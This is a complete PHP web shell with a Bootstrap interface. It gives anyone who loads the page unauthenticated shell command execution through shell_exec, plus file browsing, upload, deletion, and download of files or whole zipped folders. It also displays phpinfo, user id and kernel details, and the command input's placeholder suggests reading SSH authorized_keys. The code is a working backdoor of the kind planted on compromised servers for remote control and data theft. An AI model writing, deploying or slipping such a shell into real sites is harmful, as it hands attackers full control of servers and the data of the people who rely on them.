<!--
    ===== Current features =====

    - Console (executing shell commands & displayed output)
    - File explorer (change directory, download file, download folder as zip files)
    - phpinfo() display (get information about the server, PHP runtime & extensions)
    - File uploading
    - Disk & RAM usage
-->

<?php
    session_start();

    if (isset($_GET['download'])) {
        downloadFile($_GET['download']);
    }

    if (isset($_GET['downloadFolder'])) {
        downloadFolder($_GET['downloadFolder']);
    }

    if (isset($_POST['directPath'])) {
        $_SESSION['path'] = $_POST['directPath'];
    }

    if (empty($_SESSION['history'])) {
        $_SESSION['history'] = [];
    }

    if (isset($_GET['reset_path'])) {
        $_SESSION['path'] = __DIR__;
        refreshPage();
    }

    if (empty($_SESSION['path'])) {
        $_SESSION['path'] = __DIR__;
    }

    if (isset($_GET['delete'])) {
        deleteFile($_GET['delete']);
        refreshPage();
    }

    if (isset($_POST['upload_path'])) {
        handleFileUpload('upload_file', $_POST['upload_path']);
    }

    // Header
    $sysInfo = PHP_VERSION;
    list($phpVersion, $systemVersion) = explode('+', $sysInfo);
    $directory = __DIR__;
    $kernelVersion = php_uname('r');
    $phpUser = get_current_user();
    $completeUname = shell_exec('uname -a');

    $showPhpInfo = isset($_GET['phpinfo']);

    $serverTime = date('Y-m-d H:i:s');

    // Sub header
    $uid = shell_exec('id');
    $diskFreeSpace = disk_free_space('/');
    $diskTotalSpace = disk_total_space('/');

    if ($diskFreeSpace && $diskTotalSpace) {
        $diskFreeSpacePercentage = number_format(($diskFreeSpace / $diskTotalSpace) * 100, 2);
        $diskSpaceUsed = number_format(($diskTotalSpace - $diskFreeSpace) / 1000000000, 2);

        $diskTotalSpace = number_format($diskTotalSpace / 1000000000, 2);
    }

    // Console
    $command = isset($_POST['command']) ? $_POST['command'] : false;

    if ($command) {
        $_SESSION['history'][] = $command;
    }

    $history = $_SESSION['history'];

    // File explorer
    $path = $_GET['path'];
    $urlParts = explode('/', $path);

    if (isset($path)) {
        if (array_pop($urlParts) === '..') {
            $_SESSION['path'] = upALevel($path);
        } else {
            $_SESSION['path'] = $path;
        }

        refreshPage();
    }

    function refreshPage() {
        header('Refresh: 0; url=index.php');
    }

    /** @return array */
    function getEntriesInDirectory($path) {
        $entries = array_diff(scandir($path), ['.']);
        $finalEntries = [];

        foreach ($entries as $key => $entry) {
            $fullPath = $_SESSION['path'] . '/' . $entry;

            $finalEntries[] = [
                'name' => $key === 1 ? $entry . ' (back)' : $entry,
                'type' => is_file($fullPath) ? 'file' : 'folder',
                'fullPath' => $fullPath,
                'size' => is_file($fullPath) ? number_format(filesize($fullPath) / 1000, 2) . ' Kb': '-',
                'createdAt' => date('Y-m-d H:i:s', filectime($fullPath)),
                'updatedAt' => date('Y-m-d H:i:s', filemtime($fullPath))
            ];
        }

        $folders = array_filter($finalEntries, function ($entry) {
            return $entry['type'] === 'folder';
        });
        $files = array_filter($finalEntries, function ($entry) {
            return $entry['type'] === 'file';
        });

        usort($folders, function ($a, $b) {
            return strcmp($a['name'], $b['name']);
        });
        usort($files, function ($a, $b) {
            return strcmp($a['name'], $b['name']);
        });

        return array_merge($folders, $files);
    }

    /** @return string */
    function upALevel($path) {
        $parts = explode('/', $path);
        return implode('/', array_slice($parts, 0, -2));
    }

    function getFileName($path) {
        $parts = explode('/', $path);
        return array_pop($parts);
    }

    function downloadFile($path) {
        header('Content-Disposition: attachment; filename=' . getFileName($path));
        header('Content-Type: application/octet-stream');
        ob_clean();

        readfile($path);
    }

    function deleteFile($path) {
        if (is_file($path)) {
            unlink($path);
        }
    }

    function downloadFolder($path) {
        $outputPath = zipFolder($path);
        downloadFile($outputPath);
    }

    /**
     * @param string $path
     *
     * @return string|null|void
     */
    function zipFolder($path) {
        $outputPath = sys_get_temp_dir() . '/' . getFileName($path) . '_'. time() . '.zip';
        $zipIsInstalled = strpos(shell_exec('which zip'), 'zip');

        if ($zipIsInstalled) {
            return zipUsingCli($path, $outputPath);
        } elseif (class_exists('ZipArchive')) {
            return zipUsingZipArchive($path, $outputPath);
        } else {
            refreshPage();
        }
    }

    function zipUsingCli($path, $target) {
        $command = "cd $path && zip -r $target *";
        shell_exec($command);

        return $target;
    }

    function zipUsingZipArchive($path, $target) {
        $zipArchive = new ZipArchive();
        $zipArchive->open($target, ZipArchive::CREATE | ZipArchive::OVERWRITE);

        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path),
            RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($files as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($path) + 1);

                $zipArchive->addFile($filePath, $relativePath);
            }
        }

        return $zipArchive->close() ? $target : null;
    }

    function handleFileUpload($fileKey, $path) {
        $fileTemporaryPath = $_FILES[$fileKey]['tmp_name'];
        $fileName = $_FILES[$fileKey]['name'];
        move_uploaded_file($fileTemporaryPath, $path . '/' . $fileName);
    }

    /**
     * @param string $command
     * @return string
     */
    function executeCommand($command) {
        return shell_exec($command . ' 2>&1');
    }

    if ($command) {
        $command = executeCommand($command);
    }

    $directoryFiles = getEntriesInDirectory($_SESSION['path']);

    if ($showPhpInfo) {
        phpinfo();
    } else {
?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="charset" content="UTF-8">
    <title>WebShell</title>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"/>

    <style>
        header { height: 6vh }
        main { height: 94vh; margin-top: 6vh; padding-top: 10px }
        .console { background: black; color: white }
        .console input { background: black; border: none; width: 100%; padding-left: 7px; color: white }
        .console input:focus { outline: none }
        .console label { padding-left: 5px }
    </style>
</head>
<body>
    <header class="bg-dark text-white d-flex justify-content-around fixed-top">
        <div class="col-5 d-flex align-items-center">
            <span class="ms-3 pe-3">PHP: <?= $phpVersion ?></span>
            <span class="pe-3">System: <?= ucfirst($systemVersion) ?></span>
            <span class="pe-3">Kernel version: <?= $phpVersion ?></span>
            <span class="pe-3"><a href="?phpinfo" target="_blank">phpinfo()</a></span>
            <span><?= $serverTime ?></span>
        </div>
        <div class="col-2 text-center">
            <h1 class="h3 pt-2">Webshell</h1>
        </div>
        <div class="col-5 d-flex align-items-center">
            <span class="pe-3">User: <?= $phpUser ?></span>
            <span>Directory: <?= $directory ?></span>
        </div>
    </header>

    <!-- Upload modal -->
    <div class="modal fade" id="uploadModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Upload a file</h5>
                </div>

                <div class="modal-body">
                    <form action="" method="post" enctype="multipart/form-data" id="fileUploadForm" class="d-flex flex-column">
                        <label for="file" class="form-label">Choose your file</label>
                        <input type="file" class="mb-2 form-control" name="upload_file" id="file">
                        <label for="path" class="form-label">Upload to</label>
                        <input type="text" class="form-control mb-2" id="path" name="upload_path" value="<?= $_SESSION["path"] ?>">
                    </form>
                </div>

                <div class="modal-footer">
                    <input type="submit" class="btn btn-success" id="fileUploadSubmit" value="Upload file">
                </div>
            </div>
        </div>
    </div>
    <!-- Upload modal end -->

    <main>
        <div class="container-fluid h-100">
            <div class="h-100 d-flex justify-content-between">
                <div class="col-6 d-flex flex-column">
                    <table class="table table-bordered table-sm mb-2" aria-describedby="System information table">
                        <thead>
                            <tr>
                                <th>ID & System information</th>
                                <th>Disk & RAM info</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>
                                    UID: <?= $uid ?>
                                </td>
                                <td>
                                    <?php
                                    if (isset($diskFreeSpacePercentage)) {
                                        ?>
                                        <p>Disk usage: <?= $diskSpaceUsed ?>Go/<?= $diskTotalSpace ?> Go (<?= $diskFreeSpacePercentage ?>% used)</p>
                                        <?php
                                    }
                                    ?>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2"><?= $completeUname ?></td>
                            </tr>
                        </tbody>
                    </table>

                    <form class="console d-flex pt-1 mt-1 rounded-top" action="" method="post">
                        <label for="command">$</label>
                        <input id="command" type="text" name="command" onkeyup="inputKeyUp(event)" autofocus placeholder="cat ~/.ssh/authorized_keys">
                    </form>
                    <pre class="bg-black text-white h-100 pt-2 px-2 w-100 rounded-bottom" onclick="focusTerminal(this)"><?= $command ?: '' ?></pre>
                </div>
                <div class="col-6 h-100 pb-3">
                    <div class="ps-2 h-100 d-flex flex-column">
                        <div class="d-flex justify-content-between mb-1">
                            <h2 class="h4 d-flex align-items-center h-100">File explorer (<span id="resultsCount"><?= count($directoryFiles) ?></span>)</h2>
                            <input type="button" class="btn btn-warning" value="Upload a file" data-bs-toggle="modal" data-bs-target="#uploadModal">
                        </div>
                        <form method="post" action="" class="d-flex">
                            <label for="directPath"></label>
                            <input type="text" name="directPath" class="form-control" id="directPath" value="<?= $_SESSION['path'] ?>">
                            <a href="?reset_path" class="ms-1 btn btn-primary" style="width: 150px">Reset path</a>
                        </form>

                        <label for="research"></label>
                        <input type="text" id="research" class="form-control d-flex my-1" placeholder="Research (<?= count($directoryFiles) ?> results)" onkeyup="filter(this)">

                        <div class="overflow-scroll" style="max-height: 80vh">
                            <table class="table table-sm table-hover h-50" aria-describedby="File explorer table">
                                <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Size</th>
                                    <th>Created at</th>
                                    <th>Updated at</th>
                                    <th>Action</th>
                                </tr>
                                </thead>
                                <tbody id="table-body">
                                <?php
                                foreach ($directoryFiles as $key => $entry) {
                                    echo '<tr>';
                                    if ($entry['type'] === 'file') {
                                        echo "<td>{$entry['name']}<a title='Download this file' href='?download={$entry['fullPath']}'><i class='ms-2 fa fa-download'></i></a></td>";
                                    } else {
                                        echo "<td><a href='?path={$entry['fullPath']}'><i class='me-2 fa fa-folder'></i>{$entry['name']}<a title='Download this folder as a zip file' href='?downloadFolder={$entry['fullPath']}'><i class='ms-2 fa fa-download'></i></a></td>";
                                    }
                                    echo "<td>{$entry['size']}</td>";
                                    echo "<td>{$entry['createdAt']}</td>";
                                    echo "<td>{$entry['updatedAt']}</td>";

                                    if ($entry['type'] === 'file') {
                                        echo "<td>
                                            <a href='?delete={$entry['fullPath']}' class='badge bg-danger needsConfirmation'><i class='fa fa-trash text-white'></i></a>
                                        </td>";
                                    } else {
                                        echo "<td></td>";
                                    }
                                    echo '</tr>';
                                }
                                ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const history = JSON.parse(`<?= json_encode($history) ?>`);

        let cursor = history.length - 1;

        let lastKeyPressed = null;

        const input = document.querySelector('#command');
        const tableContainer = document.querySelector('#table-container');
        const tableBody = document.querySelector('#table-body');

        const fileUploadForm = document.querySelector('#fileUploadForm');
        const fileUploadSubmit = document.querySelector('#fileUploadSubmit');

        const needConfirmationLinks = document.querySelectorAll('.needsConfirmation');

        needConfirmationLinks.forEach((element) => {
            element.addEventListener('click', (event) => {
                const element = event.target;
                event.preventDefault();

                if (confirm('Are you sure ?')) {
                    goToUrl(element.href);
                }
            });
        });

        function goToUrl(link) {
            window.location.href = link;
        }

        fileUploadSubmit.addEventListener('click', () => {
            fileUploadForm.submit();
        });

        function focusTerminal(element) {
            if (element.innerText === '') {
                input.focus();
            }
        }

        updateEntriesCount();

        function inputKeyUp(event) {
            if (lastKeyPressed === null) {
                lastKeyPressed = event.keyCode;
            }
            if (event.keyCode === 38) {
                loadPreviousCommand(lastKeyPressed === 38);
            } else if (event.keyCode === 40) {
                loadNextCommand(lastKeyPressed === 40);
            }
            lastKeyPressed = event.keyCode;
        }

        function loadPreviousCommand(isLastKeyTheSame) {
            if (cursor === -1) {
                return;
            }
            input.value = getCommandText();
            cursor -= isLastKeyTheSame ? 1 : 2;
        }

        function loadNextCommand(isLastKeyTheSame) {
            if (cursor === history.length - 1) {
                input.value = '';
                return;
            }
            cursor += isLastKeyTheSame ? 1 : 2;
            input.value = getCommandText();
        }

        function getCommandText() {
            return history[cursor];
        }

        function filter(element) {
            const search = element.value;
            const rows = tableBody.querySelectorAll('tr');

            rows.forEach(element => {
                if (!element.innerHTML.includes(search)) {
                    element.classList.add('d-none');
                } else {
                    element.classList.remove('d-none');
                }
            });

            updateEntriesCount();
        }

        function updateEntriesCount() {
            const rows = tableBody.querySelectorAll('tr');
            document.querySelector('#resultsCount').innerText = Array
                .from(rows)
                .filter(element => !element.classList.contains('d-none'))
                .length;
        }
    </script>
</body>
</html>

<?php
    }
?>
